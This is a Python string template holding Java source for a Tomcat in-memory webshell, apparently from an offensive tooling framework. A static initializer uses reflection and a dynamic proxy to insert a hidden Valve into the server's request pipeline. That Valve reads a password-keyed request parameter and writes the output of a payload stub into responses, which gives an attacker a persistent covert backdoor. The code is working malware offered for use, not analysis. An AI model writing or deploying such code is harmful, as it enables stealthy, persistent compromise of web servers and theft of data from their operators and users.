code = """
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.Scanner;

public class TomcatValve extends ClassLoader implements InvocationHandler {{
    private static String password = "{password}";
    private static Object nextvalve = null;
{common}
{decoder}
{stub}
    private void hook(Object request, Object response) throws Exception {{
        String payload = (String) invokeMethod(
                request, "getParameter", password
        );
        invokeMethod(
                invokeMethod(response, "getWriter"),
                "write", stub(payload, request, response)
        );
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        String methodName = method.getName();
        if (methodName.equals("invoke")) {{
            Object request = args[0];
            Object response = args[1];
            hook(request, response);
            Method invoke = getMethodX(nextvalve.getClass(), "invoke", 2);
            invoke.setAccessible(true);
            invoke.invoke(nextvalve, request, response);
        }} else if (methodName.equals("setNext")) {{
            nextvalve = args[0];
        }} else if (methodName.equals("getNext")) {{
            return nextvalve;
        }} else if (methodName.equals("toString")) {{
            return this.getClass().getName();
        }} else if (methodName.equals("isAsyncSupported")) {{
            return false;
        }}
        return null;
    }}

    private void addValve(Object proxyObject)
            throws InvocationTargetException, IllegalAccessException {{
        Object context = getStandardContext();
        Object pipeline = invokeMethod(context, "getPipeline");
        getMethodX(pipeline.getClass(), "addValve", 1).invoke(pipeline, proxyObject);
    }}

    public TomcatValve() {{
        synchronized(lock) {{
            Class valveClass = null;
            try {{
                valveClass = Class.forName(
                        "org.apache.catalina.Valve"
                );
            }} catch (ClassNotFoundException e) {{}}

            if (valveClass != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                        getLoader(),
                        new Class[]{{valveClass}},
                        this
                );
                try {{
                    addValve(proxyObject);
                }} catch (Exception e) {{}}
            }}
        }}
    }}

    public TomcatValve(ClassLoader loader) {{
        super(loader);
    }}

    static {{
        new TomcatValve();
    }}
}}
"""